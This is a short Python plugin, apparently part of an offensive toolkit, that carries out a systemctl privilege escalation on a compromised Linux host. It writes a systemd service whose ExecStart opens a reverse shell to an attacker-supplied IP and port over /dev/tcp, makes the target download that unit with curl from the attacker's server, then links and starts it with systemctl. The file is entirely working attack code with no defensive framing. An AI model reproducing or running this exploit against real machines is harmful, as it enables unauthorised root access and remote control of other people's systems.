#!/usr/bin/python3
# @Мартин.
# ███████╗              ██╗  ██╗    ██╗  ██╗     ██████╗    ██╗  ██╗     ██╗    ██████╗
# ██╔════╝              ██║  ██║    ██║  ██║    ██╔════╝    ██║ ██╔╝    ███║    ╚════██╗
# ███████╗    █████╗    ███████║    ███████║    ██║         █████╔╝     ╚██║     █████╔╝
# ╚════██║    ╚════╝    ██╔══██║    ╚════██║    ██║         ██╔═██╗      ██║     ╚═══██╗
# ███████║              ██║  ██║         ██║    ╚██████╗    ██║  ██╗     ██║    ██████╔╝
# ╚══════╝              ╚═╝  ╚═╝         ╚═╝     ╚═════╝    ╚═╝  ╚═╝     ╚═╝    ╚═════╝

from plugin.core import core
import re
import time


class systemctl:
    def exploit(self, socks, ip, port, re_ip, re_port):
        payload = f'''
[Service]
Type=oneshot
ExecStart=/bin/bash -c '/bin/bash -i >&/dev/tcp/{re_ip}/{re_port} 0>&1'
[Install]
WantedBy=multi-user.target
        '''
        with open('./plugin/pwn.service','w')as f:
            f.write(payload)
        time.sleep(2) 
        core.send_command(socks, f"curl http://{ip}:{port}/plugin/pwn.service >/tmp/pwn.service ")
        time.sleep(10)
        core.send_command(socks, 'systemctl link /tmp/pwn.service')
        time.sleep(1)
        core.send_command(socks, f"systemctl start pwn.service")
        print("[+] Systemctl privilege escalation completed...")

